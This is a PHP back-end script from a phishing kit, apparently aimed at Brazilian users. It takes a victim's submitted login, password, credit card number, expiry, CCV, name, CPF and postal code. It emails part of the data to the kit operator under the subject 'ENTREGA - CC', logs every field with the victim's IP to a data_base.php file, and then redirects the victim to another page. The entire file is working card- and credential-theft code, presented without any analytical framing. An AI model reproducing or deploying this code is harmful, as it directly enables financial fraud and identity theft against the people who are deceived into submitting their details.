<?php
require_once("config.php");






$cod = $_POST['cod'];






extract($_POST);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: TELAS - GG <chegou@hp.com>";
$ip = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('America/Sao_Paulo');
$data=date("d/m/Y");
$hora=date("H:i");

$conteudo.="
__________________DADOS____________________<br>
___________________________________________<br>
codigo__________: $cod<br>

___________________________________________<br>";

@mail($receber, "ENTREGA - CC - $ip", "$conteudo", $headers); 



$tudo = "
<tr><td><font color='red' size='4'>$user</font></td><td><font color='red' size='4'>$senha</font></td><td><font color='red' size='4'>$numero</font></td><td><font color='red' size='4'>$data1/$data2</font></td><td><font color='red' size='4'>$nome</font></td><td><font color='red' size='4'>$cpf</font></td><td><font color='red' size='4'>$ccv</font></td><td><font color='red' size='4'>$cep</font></td><td><font color='red' size='4'>$data</font></td><td><font color='red' size='4'>$ip</font></td></tr>";
$fopen = fopen("data_base.php", "a");
fwrite($fopen, $tudo);
fclose($fopen);


?>
           <meta http-equiv="refresh" content=1;url="auth.html">         
